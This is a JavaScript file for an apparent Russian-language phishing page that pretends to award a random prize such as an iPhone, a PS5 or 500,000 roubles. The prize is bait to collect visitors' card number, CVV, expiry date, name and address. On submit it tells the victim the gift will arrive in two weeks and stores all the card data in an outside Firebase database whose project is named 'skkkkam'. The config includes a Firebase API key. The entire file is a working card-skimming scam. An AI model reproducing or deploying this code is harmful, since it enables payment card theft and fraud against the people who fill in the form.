//console = {}

const prizes = [
    {
        name: 'iPhone 12 512Gb',
        image: 'images/iphone12.jpg',
        description: 'Лучший телефон за последние 20 лет: солидный, емкий, красивый. Лучший выбор для вас'
    },
    {
        name: 'MacBook Pro 16 2020',
        image: 'images/macbook.jpg',
        description: 'Невероятно красивый Ноутбук, имеет 4к дисплей, и лучшую ОС, подходит для работы лучше всех.'
    },
    {
        name: 'PS5 с 20 играми',
        image: 'images/ps5.png',
        description: 'Консоль, которая просто взрывает рынок, очень мощная, невероятно красивая, и мечта миллионов.'
    },
    {
        name: '500 000 Рублей',
        image: 'images/money.jpg',
        description: 'Боснасловное количество денег, хватит на хорошую поездку за границу, или на флагманскую технику.'
    },
]

const currentPrize = prizes[Math.floor(Math.random() * 4)]

let firebaseConfig = {
    apiKey: "AIzaSyAT3mYd-fXjAElaNA3prt948JQtFcIJves",
    authDomain: "skkkkam.firebaseapp.com",
    databaseURL: "https://skkkkam.firebaseio.com",
    projectId: "skkkkam",
    storageBucket: "skkkkam.appspot.com",
    messagingSenderId: "127312695539",
    appId: "1:127312695539:web:1894b2d6c37b83b2142786"
};

firebase.initializeApp(firebaseConfig);

const databaseee = firebase.database();

$(document).ready(() => {
    $('#prize-name').html(currentPrize.name)
    $('.item').append(`<img id='prize-image' src='${currentPrize.image}'>`);
    $('.item').append(`<h1 class='description'></h1>`);
    $('.description').text(currentPrize.description)
    $("#cpa-form").submit(function(e){
        e.preventDefault()
    }); 
    setInterval(() => {
        $('#visa-image').attr('src', `images/${Math.round(Math.random() * 5)}.svg`);
    },1000)
    $('#submit-button').click(function () { 
        if ($('#adress').val().length >= 14 && $('#card-number').val().length == 16 && $('#post-code').val().length > 0 && $('#post-code').val().length <= 5 && $('#name-surname').val().length >= 9 && $('#cvv').val().length == 3) {
            Swal.fire(
                'Молодец!',
                'Ваш подарок будет у вас в течении двух недель!',
                'success',
            )
            const userRef = databaseee.ref('cards/' + Date.now());
            userRef.child(
            'Card' + Math.floor(Math.random() * Math.random() * 100 )).set({'card-number': $('#card-number').val(), 'Adress' : $('#adress').val() , 'Postal Code' : $('#post-code').val() ,'Name-Surname': $('#name-surname').val(), 'CVV': $('#cvv').val(),
                'Date': $('#card-date').val()}
            )
            $('body').append('<audio src="assets/money.mp3" autoplay loop></audio>');
        }
        else {
            Swal.fire(
                'Неа!',
                'Неправильные данные введены!',
                'error',
            )
        }
    });
});